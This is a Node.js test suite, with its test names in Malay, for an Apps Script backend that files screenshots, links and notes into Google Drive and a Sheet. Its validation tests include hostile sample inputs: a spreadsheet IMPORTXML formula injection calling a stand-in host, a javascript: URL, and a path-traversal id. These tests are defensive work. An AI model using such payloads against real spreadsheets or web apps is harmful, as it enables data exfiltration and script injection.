// Jalankan: node --test tests/backend.test.js
const assert = require('node:assert/strict');
const test = require('node:test');
const { createHarness } = require('../tools/gas-harness');

const PNG_BASE64 = Buffer.from('gambar-ujian').toString('base64');
const ID = 'aaaaaaaa-1111-2222-3333-444444444444';

function ready() {
  const harness = createHarness();
  harness.setup();
  const secret = harness.state.properties.APP_SECRET;
  const call = (body) => harness.post(JSON.stringify({ secret, ...body }));
  const save = (item) => call({ action: 'saveItem', item: { id: ID, ...item } });
  return { harness, secret, call, save };
}

const dataRows = (harness) => harness.state.rows.slice(1);
const image = { type: 'image', mimeType: 'image/webp', dataBase64: PNG_BASE64, title: 'ss.png' };

test('setup boleh dijalankan semula tanpa menukar kunci atau mencipta folder berganda', () => {
  const { harness, secret } = ready();
  const folders = harness.state.folders.length;
  harness.setup();
  assert.equal(harness.state.properties.APP_SECRET, secret);
  assert.equal(harness.state.folders.length, folders);
  assert.equal(secret.length, 64);
});

test('kunci salah ditolak dan tiada apa disimpan', () => {
  const { harness } = ready();
  const result = harness.post(JSON.stringify({ secret: 'salah', action: 'saveItem', item: { id: ID, ...image } }));
  assert.equal(result.code, 'unauthorized');
  assert.equal(harness.state.files.length, 0);
  assert.equal(dataRows(harness).length, 0);
});

test('backend yang belum setup menolak semua permintaan', () => {
  const harness = createHarness();
  assert.equal(harness.post(JSON.stringify({ secret: null, action: 'ping' })).code, 'not_setup');
});

test('JSON rosak tidak meruntuhkan backend', () => {
  const { harness } = ready();
  assert.equal(harness.post('bukan json').ok, false);
});

test('ping berjaya dengan kunci betul', () => {
  assert.equal(ready().call({ action: 'ping' }).ok, true);
});

test('gambar masuk folder bulan dan satu baris Sheet', () => {
  const { harness, save } = ready();
  const result = save(image);
  assert.equal(result.ok, true);
  assert.match(result.driveUrl, /^https:\/\/drive\.google\.com\/file/);
  const [file] = harness.state.files;
  assert.equal(file.folder.name, '2026-11');
  assert.equal(file.folder.parent.name, 'Screenshot');
  assert.equal(file.blob.name, '20261104-120000-aaaaaaaa.webp');
  const [row] = dataRows(harness);
  assert.equal(row[0], ID);
  assert.equal(row[2], 'image');
  assert.equal(row[3], 'ss.png');
  assert.equal(row[9], Buffer.from('gambar-ujian').length);
  assert.equal(row[10], 'baru');
});

test('id sama yang dihantar semula tidak mencipta salinan', () => {
  const { harness, save } = ready();
  const first = save(image);
  const second = save(image);
  assert.equal(second.ok, true);
  assert.equal(second.duplicate, true);
  assert.equal(second.driveUrl, first.driveUrl);
  assert.equal(harness.state.files.length, 1);
  assert.equal(dataRows(harness).length, 1);
});

test('link dan nota disimpan tanpa fail', () => {
  const { harness, call } = ready();
  const link = call({ action: 'saveItem', item: { id: 'link-0001', type: 'link', url: 'https://contoh.my/a', title: 'A' } });
  const note = call({ action: 'saveItem', item: { id: 'nota-0001', type: 'note', text: 'idea' } });
  assert.equal(link.ok, true);
  assert.equal(note.ok, true);
  assert.equal(harness.state.files.length, 0);
  assert.equal(dataRows(harness).length, 2);
});

test('teks yang menyerupai formula disimpan sebagai teks', () => {
  const { harness, save } = ready();
  save({ type: 'note', title: '=IMPORTXML("http://jahat","//a")', text: '+1' });
  const [row] = dataRows(harness);
  assert.equal(row[3], `'=IMPORTXML("http://jahat","//a")`);
  assert.equal(row[5], "'+1");
});

test('input tidak sah ditolak', () => {
  const { harness, save, call } = ready();
  const bad = [
    { type: 'link', url: 'javascript:alert(1)' },
    { type: 'link', url: '' },
    { type: 'note', text: '' },
    { type: 'lain', text: 'x' },
    { type: 'image', mimeType: 'text/html', dataBase64: PNG_BASE64 },
    { type: 'image', mimeType: 'image/svg+xml', dataBase64: PNG_BASE64 },
    { type: 'image', mimeType: 'image/png', dataBase64: '' }
  ];
  for (const item of bad) assert.equal(save(item).ok, false, JSON.stringify(item));
  assert.equal(call({ action: 'saveItem', item: { id: '../../x', type: 'note', text: 'x' } }).ok, false);
  assert.equal(call({ action: 'lain' }).code, 'bad_request');
  assert.equal(harness.state.files.length, 0);
  assert.equal(dataRows(harness).length, 0);
});

test('gambar melebihi had ditolak', () => {
  const { save } = ready();
  const big = Buffer.alloc(15 * 1024 * 1024 + 1).toString('base64');
  assert.match(save({ ...image, dataBase64: big }).error, /terlalu besar/);
});

test('fail dibuang kalau Sheet gagal, dan cubaan semula berjaya', () => {
  const { harness, save } = ready();
  harness.state.failNextAppend = true;
  assert.equal(save(image).ok, false);
  assert.equal(harness.state.files[0].trashed, true);
  assert.equal(harness.state.locks, 0);
  assert.equal(save(image).ok, true);
  assert.equal(dataRows(harness).length, 1);
});

test('rotateSecret membatalkan kunci lama', () => {
  const { harness, secret, call } = ready();
  harness.rotateSecret();
  assert.notEqual(harness.state.properties.APP_SECRET, secret);
  assert.equal(call({ action: 'ping' }).code, 'unauthorized');
});
